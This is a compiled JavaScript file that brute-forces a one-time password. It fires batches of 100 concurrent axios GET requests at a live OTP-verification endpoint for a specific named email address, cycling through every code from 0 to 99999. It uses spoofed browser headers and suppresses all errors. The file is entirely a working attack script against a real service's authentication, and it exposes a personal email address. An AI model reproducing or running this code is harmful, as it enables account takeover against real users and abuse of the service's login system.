"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let config = {
            method: 'get',
            maxBodyLength: Infinity,
            url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=harshkeshri1234567%40gmail.com&otp=' + otp,
            headers: {
                'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.5',
                'auth-key': 'appxapi',
                'client-service': 'Appx',
                'device-type': '',
                'origin': 'https://100xdevs.com',
                'priority': 'u=1, i',
                'referer': 'https://100xdevs.com/',
                'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'sec-gpc': '1',
                'source': 'website',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
            }
        };
        try {
            yield axios_1.default.request(config);
        }
        catch (e) {
        }
    });
}
// sendRequest("264291");
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i <= 99999; i += 100) {
            const p = [];
            console.log(i);
            // promise
            for (let j = 0; j < 100; j++) {
                p.push(sendRequest((i + j).toString()));
            }
            yield Promise.all(p);
        }
    });
}
main();
